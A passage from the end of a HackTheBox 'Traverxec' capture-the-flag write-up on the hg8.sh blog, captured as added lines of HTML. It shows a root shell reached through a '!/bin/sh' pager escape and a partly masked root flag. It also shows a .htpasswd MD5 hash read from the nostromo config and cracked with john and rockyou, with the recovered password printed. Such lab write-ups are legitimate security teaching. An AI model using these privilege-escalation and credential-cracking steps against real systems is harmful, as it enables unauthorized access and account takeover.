+Nov <span style="color:#ae81ff">18</span> 07:00:58 traverxec systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Started nostromo nhttpd serve
+!/bin/sh
+<span style="color:#75715e"># bash</span>
+root@traverxec:/home/david/bin# cd
+root@traverxec:~# ls
+nostromo_1.9.6-1.deb  root.txt
+root@traverxec:~# cat root.txt
+9xxxxxxxxxxxxxxxxx6
+</code></pre></div><p>Now that we are root and done let&rsquo;s not forget to clean up our changes to not spoil other users!</p>
+<h2 id="additional-notes">Additional notes</h2>
+<p>I will put here a few additional information about this box that could be useful to others.</p>
+<h3 id="htpassw-bruteforce">.htpassw bruteforce</h3>
+<p>As you could have noticed in the user flag recon part, a <code>.htpasswd</code> if available, this one is used to restrict access to the <code>protected-file-area</code> folder in <code>david</code> homedir:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/71325453-6e9f3c80-24ed-11ea-8507-3c758091d65c.png" alt="basic auth traverxec"></p>
+<p>It was possible to brute-force this <code>.htpasswd</code> file even if it was not needed to solve the box. Here how to do it using the good old <code>john</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/$ cat /var/nostromo/conf/.htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;david:</span>$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ<span style="color:#e6db74">/&#34;</span> &gt; david.hash
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --wordlist<span style="color:#f92672">=</span>/home/hugo/SecLists/Passwords/Leaked-Databases/rockyou.txt david.hash
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>md5crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $1$ <span style="color:#f92672">(</span>and variants<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>MD5 128/128 AVX 4x3<span style="color:#f92672">])</span>
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+Nowonly4me       <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+1g 0:00:01:35 DONE <span style="color:#f92672">(</span>2019-11-17 19:28<span style="color:#f92672">)</span> 0.01052g/s 111325p/s 111325c/s 111325C/s Noyoo..NovemberRain
+Session completed
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --show david.hash
+david:Nowonly4me
+</code></pre></div><p>Let&rsquo;s now try to access the <code>protected-file-area</code> using those credentials:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/71325488-f4bb8300-24ed-11ea-9885-e4ef90f7d370.png" alt="david homedir htaccess"></p>
+<p>Success!</p>
+<hr>
+<p>That&rsquo;s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/registry/">
+                  <span class="button__text">Registry - HackTheBox</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        <br><br>
+<script src="https://utteranc.es/client.js"
+        repo="hg8/hg8.github.io"
+        issue-term="pathname"
+        label="💬 Comment"
+        theme="photon-dark"
+        crossorigin="anonymous"
+        async>
+</script>
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="footer__content">
+        <span>© 2020</span>
+        <span><a href="https://hg8.sh" target="_blank" rel="noopener">hg8.sh</a></span>
+        <span>
+          &nbsp; 
+          <a class="social-icon" href="https://twitter.com/_hg8_" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
+          &nbsp; 
+          <a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
+          &nbsp;
+          <a class="social-icon" href="https://www.hackthebox.eu/profile/128102" target="_blank" rel="noopener" title="hackthebox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></a>
+          &nbsp; 
+          <a class="social-icon" href="https://hg8.sh/index.xml" target="_blank" rel="noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+        </span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+      
+    </div>
+
+    
+  </body>
+</html>
